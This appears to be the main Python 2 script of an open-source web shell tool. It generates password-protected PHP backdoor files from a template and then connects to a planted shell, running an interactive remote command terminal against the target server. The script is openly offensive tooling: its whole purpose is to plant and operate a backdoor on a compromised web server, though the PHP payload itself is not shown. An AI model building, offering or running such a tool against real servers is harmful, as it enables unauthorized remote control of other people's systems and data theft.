#!/usr/bin/python
# import requests
import sys
import os
import urllib  
import json
import argparse
import sqlite3 as lite
from core.terminal import Terminal
from core.server import Server

try:
    con = lite.connect('db/database.db')
    cur = con.cursor()                  
    cur.execute("INSERT INTO Shell VALUES(1,'xxx','xxx','xxx')")
except lite.Error, e:
    
    print "Error %s:" % e.args[0]
    sys.exit(1)
# Create table
parser = argparse.ArgumentParser()
parser.add_argument("-u", help="Url")
parser.add_argument("-g", help="Generate Shell")
parser.add_argument("-p", help="Password")
args = parser.parse_args()
#BANNER 
print "\n"   
for line in open("extras/banner.txt"):
	print line,
print "\n"   
print "     [*]------------------- WebShell Ver. 0.1 @matiasmenares -------------------[*]\n"
print "     	  [*]------------------- Fork me on github -------------------[*]\n"
print "\n"
if args.u and args.p:
	url = args.u
	password = args.p
if args.g and args.p:
	name = args.g  # Name of text file coerced with +.txt
	password = args.p
	isphp = name.partition('.')
	if isphp[2] == "php":
		print 'Creating Shell file...'
		try:
			file =  open(name, 'w')   # Trying to create a new file or open one
			file.close()
			create = True
			with open('backdoor/shell.php') as f:
				with open(name, "w") as f1:
					for line in f:
						if "<password>" in line:
							f1.write("		if($_GET['pass'] == '"+password+"'){ \n")
						else:
							f1.write(line)
		except:
			print('Something went wrong!')
			sys.exit(1)
	print('Shell was created!')
	sys.exit(1)	
			
if args.u and args.p:			
	Server = Server(args.u,args.p)
	con = Server.conect()
	if con['response'] == '200':
		print "#> Conecction Established, Enjoy!\n"
		terminal = Terminal(url,args.p)
		server_info = Server.server_info()
		while True:
			send = raw_input(server_info['server_name']+"@"+server_info['user']+"["+server_info['pwd']+"]"+server_info['user_bash']+">")
			termina = terminal.terminal(send)
			print termina['command']
	elif con['response'] == '302':
		print "robot@shelly[~]$> Response: "+con['error']
	else:
		print "robot@shelly[~]$> Connection fail."